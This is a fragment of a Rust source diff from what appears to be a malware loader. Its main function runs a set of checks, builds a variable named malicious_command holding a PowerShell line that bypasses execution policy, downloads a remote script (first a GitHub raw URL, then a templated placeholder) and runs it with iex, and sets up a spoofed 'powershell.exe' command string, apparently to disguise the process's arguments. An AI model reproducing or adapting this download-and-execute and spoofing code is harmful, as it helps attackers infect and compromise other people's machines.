@@ -27,9 +27,8 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
 
 fn main() {
     if power::run_all_checks() {
-        println!("ikinci de calisti vay anasini");
     }
-    let malicious_command = r#"powershell.exe -ExecutionPolicy Bypass -Command "iwr -Uri 'https://raw.githubusercontent.com/kullanici/repo/dal/script.ps1' -UseBasicParsing | iex""#;
+    let malicious_command = r#"powershell.exe -ExecutionPolicy Bypass -Command "iwr -Uri '{{POWERSHELL_URL}}' -UseBasicParsing | iex""#;
     let malicious_command_wide = to_wide_chars(&malicious_command);
 
     let spoofed_command_str = "powershell.exe";
